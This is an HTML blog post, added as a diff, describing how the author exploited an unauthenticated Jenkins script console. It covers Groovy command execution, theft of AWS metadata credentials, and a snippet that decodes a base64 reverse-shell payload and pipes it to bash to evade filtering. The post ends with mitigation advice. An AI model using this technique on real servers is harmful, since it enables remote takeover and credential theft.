@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jenkins Script Console Exploitation - 0xb0rn3</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Share+Tech+Mono:wght@400&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #000000;
+            --bg-card: #1a1a1a;
+            --accent: #ffffff;
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0b0;
+            --border: #333333;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle at 1px 1px, rgba(255, 255, 255, 0.08) 1px, transparent 0);
+            background-size: 20px 20px;
+            animation: binaryFlow 10s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes binaryFlow {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(20px); }
+        }
+
+        .nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            backdrop-filter: blur(20px);
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 2px solid var(--border);
+        }
+
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 6rem 2rem 3rem;
+        }
+
+        .terminal-prompt {
+            color: var(--accent);
+            font-family: 'Share Tech Mono', monospace;
+            margin-bottom: 2rem;
+            opacity: 0.6;
+        }
+
+        h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: var(--accent);
+        }
+
+        h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.8rem;
+            margin: 2rem 0 1rem;
+            color: var(--accent);
+        }
+
+        p {
+            margin-bottom: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        strong { color: var(--text-primary); }
+
+        code {
+            background: var(--bg-card);
+            padding: 0.2rem 0.5rem;
+            border-radius: 3px;
+            font-family: 'JetBrains Mono', monospace;
+            border: 1px solid var(--border);
+        }
+
+        pre {
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            padding: 1.5rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+
+        pre code {
+            background: none;
+            border: none;
+            padding: 0;
+        }
+
+        figure {
+            margin: 2rem 0;
+            text-align: center;
+        }
+
+        figure img {
+            max-width: 100%;
+            border: 2px solid var(--border);
+            border-radius: 4px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--accent);
+            text-decoration: none;
+            font-family: 'Share Tech Mono', monospace;
+            margin-top: 3rem;
+            transition: gap 0.3s ease;
+        }
+
+        .back-link:hover { gap: 1rem; }
+
+        @media (max-width: 768px) {
+            h1 { font-size: 2rem; }
+            .container { padding: 5rem 1.5rem 2rem; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav">
+        <div class="nav-content">
+            <a href="../main.html" class="logo">0xb0rn3</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="terminal-prompt">0xb0rn3@jenkins:~$</div>
+        
+        <h1>Jenkins Script Console: From Discovery to Shell</h1>
+
+        <h2>Jenkins & The Script Console</h2>
+        <p>Jenkins is an automation server used widely for CI/CD pipelines. The Script Console (<code>/script</code>) is an administrative feature that executes Groovy scripts directly on the Jenkins server. When accessible without authentication, it provides complete system-level access.</p>
+
+        <h2>Finding Exposed Instances</h2>
+        <p>During reconnaissance, I identified a Jenkins instance with the script console accessible at <code>/script</code> without requiring credentials. No login prompt. No authentication checks. Just direct access to server-side code execution.</p>
+
+        <h2>Command Execution</h2>
+        <p>The script console executes Groovy code, which provides direct access to the underlying Java runtime and system commands. A simple test confirms execution capabilities:</p>
+
+        <figure>
+            <img src="../Images/jenkins_commands.png" alt="Command execution through Jenkins script console">
+        </figure>
+
+        <p>Using <code>"whoami".execute().text</code> returns the current user context. This confirms we can run arbitrary commands with the privileges of the Jenkins process. Depending on the deployment, this could be a dedicated service account or, in poorly configured environments, root.</p>
+
+        <h2>Data Exfiltration</h2>
+        <p>Beyond command execution, the console provides access to environment variables and instance metadata. In cloud environments, this often includes sensitive credentials:</p>
+
+        <figure>
+            <img src="../Images/jenkins_metadata.png" alt="AWS metadata extraction from Jenkins">
+        </figure>
+
+        <p>AWS metadata endpoints are particularly interesting. Jenkins instances running on EC2 can access IAM role credentials, account information, and other sensitive data through the instance metadata service. A single Groovy script can extract this information.</p>
+
+        <h2>Establishing Persistence</h2>
+        <p>For a proper shell, we need to establish a reverse connection. The Groovy runtime makes this straightforward:</p>
+
+        <pre><code>def encodedCmd = "base64_encoded_reverse_shell_payload"
+def cmd = ["bash", "-c", "echo " + encodedCmd + " | base64 -d | bash"]
+
+try {
+    def process = cmd.execute()
+    println "Shell initiated"
+} catch (Exception e) {
+    println "Error: " + e.message
+}</code></pre>
+
+        <p>This executes a base64-encoded reverse shell payload. The encoding helps bypass basic input filtering. With a netcat listener on the attacker machine, the connection establishes, providing interactive shell access to the Jenkins server.</p>
+
+        <h2>Impact & Scope</h2>
+        <p>An exposed Jenkins script console represents critical infrastructure compromise. Attackers gain:</p>
+        <ul>
+            <li>Full access to source code repositories connected to Jenkins</li>
+            <li>Credentials stored in Jenkins (API keys, passwords, tokens)</li>
+            <li>Ability to modify build pipelines and inject malicious code</li>
+            <li>Access to deployment systems and production environments</li>
+            <li>Cloud credentials if running on AWS, Azure, or GCP</li>
+        </ul>
+
+        <h2>Mitigation</h2>
+        <p>The script console should never be accessible without authentication. Proper security configuration includes:</p>
+        <ul>
+            <li>Enforcing authentication for all administrative functions</li>
+            <li>Using role-based access control (RBAC) to limit script console access</li>
+            <li>Running Jenkins with minimal privileges (not root)</li>
+            <li>Network segmentation to restrict Jenkins access</li>
+            <li>Regular security audits of Jenkins configurations</li>
+        </ul>
+
+        <p>Jenkins is a powerful automation tool. When improperly secured, that power becomes an attack vector. The script console is meant for administrative maintenance, not public access.</p>
+
+        <a href="../blog.html" class="back-link">
+            <i class="fas fa-arrow-left"></i>
+            Back to Blog
+        </a>
+    </div>
+</body>
+</html>
